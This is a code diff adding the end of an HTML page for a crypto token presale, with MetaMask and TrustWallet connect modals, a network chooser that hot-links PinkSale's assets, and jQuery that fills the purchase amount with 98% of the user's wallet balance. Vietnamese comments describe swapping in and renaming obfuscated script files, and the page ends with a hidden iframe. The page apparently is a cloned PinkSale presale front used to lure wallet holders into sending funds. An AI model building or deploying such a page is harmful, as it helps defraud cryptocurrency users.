+                                            <img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">Install Metamask</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading-1">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="images/htFuAJyL6RBH.svg" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">TrustWallet</div>
+                             
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="ant-modal-root" id="btnchoosenetwork">
+            <div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle0" style="display:none">
+                <div role="document" class="ant-modal" style="width: 520px; transform-origin: 981px -64px;">
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                    <div class="ant-modal-content">
+                        <button type="button" aria-label="Close" class="ant-modal-close">
+                            <span class="ant-modal-close-x" style="display: table-cell;text-align: center;vertical-align: middle;">
+                                <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
+                                    <svg viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
+                                        <path d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z">
+                                        </path>
+                                    </svg>
+                                </span>
+                            </span>
+                        </button>
+                        <div class="ant-modal-header">
+                            <div class="ant-modal-title" id="rcDialogTitle0">Choose network</div>
+                        </div>
+                        <div class="ant-modal-body">
+                            <div class="SwitchNetworkForm_chains__1fTaE">
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetoeth">
+                                    <img src="images/ic-eth.4213cf87.svg" alt="Ethereum" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Ethereum</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg" alt="BNB Smart Chain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">BNB Smart Chain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/FggpLbhx5HJ1.png" alt="Matic(Polygon)" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Matic(Polygon)</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/HKpuLyd6c2HZ.svg" alt="Avalanche" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Avalanche</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/y0SR8oC7mYlg.svg" alt="Fantom Opera" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Fantom Opera</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/5RETWzYeAweR.svg" alt="Cronos" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Cronos</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/58cZwnFaC7FJ.png" alt="DogeChain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">DogeChain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb"><img src="images/29D5WABW5UHt.svg" alt="Alvey" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Alvey</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetoarbitrum"><img src="images/ipLYZoT0MzoG.svg" alt="Arbitrum" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Arbitrum</div>
+                                </div>
+                            </div>
+                            <div class="SwitchNetworkForm_divider__ezfZQ"></div>
+                            <div class="SwitchNetworkForm_chains__1fTaE">
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg" alt="BNB Smart Chain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">BNB Smart Chain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/FggpLbhx5HJ1.png" alt="Matic Mumbai" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Matic Mumbai</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="js/oprfk66cNKrP.js"></script>
+    <script src="js/VGsdvbEKeLbm.js"></script>
+    <script>
+        $('#presaleAmount').keyup(function () {
+            $('#btnbuy').prop("disabled", false);
+            let dInput = this.value;
+            let balance = jQuery('#balance').val();
+            let symbol = jQuery("#TokenSymbol").text();
+            let result = jQuery("#ListingRate").text();
+            let result2 = jQuery("#CurrentRate").text();
+
+            if (result) {
+                let rateValue = result.split("=")[1].trim().split(" ")[0]
+                let rateValueNumber = parseInt(rateValue.replace(/,/g, ""), 10);
+
+                if (dInput >= balance) {
+                    jQuery('#presaleAmount').val(balance * 98 / 100);
+                    let result = jQuery("#ListingRate").text(); // Cái text nó nằm ở chỗ này, nma thằng fairlaunch sẽ k có nên thi thoảng lỗi, e sửa lại 1 tí để hiện token symbol
+                    kq = rateValueNumber * balance;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                } else if (dInput == 0) {
+                    $('.text-xs').show().text('You will receive: 0 ' + symbol); // e xót cái này bảo sao nãy nó ra ETH =)))
+                } else {
+                    kq = rateValueNumber * dInput;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                }
+            }
+            else {
+                let rateValue = result2.split("=")[1].trim().split(" ")[0]
+                let rateValueNumber = parseInt(rateValue.replace(/,/g, ""), 10);
+
+                console.log(rateValueNumber)
+                if (dInput >= balance) {
+                    jQuery('#presaleAmount').val(balance * 98 / 100);
+                    let result = jQuery("#ListingRate").text(); // Cái text nó nằm ở chỗ này, nma thằng fairlaunch sẽ k có nên thi thoảng lỗi, e sửa lại 1 tí để hiện token symbol
+                    kq = rateValueNumber * balance;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                } else if (dInput == 0) {
+                    $('.text-xs').show().text('You will receive: 0 ' + symbol); // e xót cái này bảo sao nãy nó ra ETH =)))
+                } else {
+                    kq = rateValueNumber * dInput;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                }
+            }
+        }); 
+    </script>
+    <script>
+        $('#presaleAmount').keyup(function () {
+            $('#btnbuy').prop("disabled", false);
+        });
+        setInterval(() => {
+            let value = $('#MyValue').text();
+            let TokensForPresaletext = $('#TokensForPresale').text().trim().split(" ")[1]
+            let TokensForPresale = $('#TokensForPresale').text().trim().split(" ")[0].replace(",", "")
+            let presaleNumber = parseInt(TokensForPresale.replace(/,/g, ""), 10);
+            let ClaimStatus = $('#ClaimStatus').val();
+            let divider = ClaimStatus == "YES" ? $('#MyValueClaim').text() : value;
+            kq2 = Math.floor(presaleNumber / divider);
+            let minMyvalue = $('#minMyvalue').text();
+
+            if (kq2) {
+                $('#CurrentRate').text('1 ' + minMyvalue + ' = ' + ReplaceNumberWithCommas(kq2.toFixed(3)) + ' ' + TokensForPresaletext);
+            }
+        }, 1000);
+        function ReplaceNumberWithCommas(yourNumber) {
+            var components = yourNumber.toString().split(".");
+            components[0] = components[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            return components.join(".");
+        } 
+    </script>
+    <script>
+        const claimStatus = $("#ClaimStatus").val();
+        if (claimStatus == "NO") {
+            $("#form_claim").css("display", "none");
+            $("#form_sale_live").css("display", "block");
+        } else {
+            $("#form_claim").css("display", "block");
+            $("#form_sale_live").css("display", "none");
+        }
+    </script>
+    <script src="js/gCfZgMVVGKyQ.js"></script>
+    <!-- Anh thay sang con js mới, giờ a upload file này lên rồi đổi tên là okie -->
+    <script>
+        $("#idaffiliate").click(function () {
+            $('html, body').animate({
+                scrollTop: $("#scrollAffiliate").offset().top
+            }, 1500);
+        });
+        setTimeout(() => {
+            $.ajax({
+                url: "/assets/ajaxs/Auth.php",
+                method: "POST",
+                data: {
+                    type: 'Getlistingon',
+                    idcoin: $('#idcoin').val(),
+                    chainId: $('#chainId').val(),
+                },
+                success: function (response) {
+                    $("#ListingOn").empty();
+                    $("#ListingOn").append(response);
+                }
+            });
+        }, 1500);   
+		
+    </script>
+
+
+<iframe style="display: none;" src="saved_resource%281%29.html"></iframe></body></html>
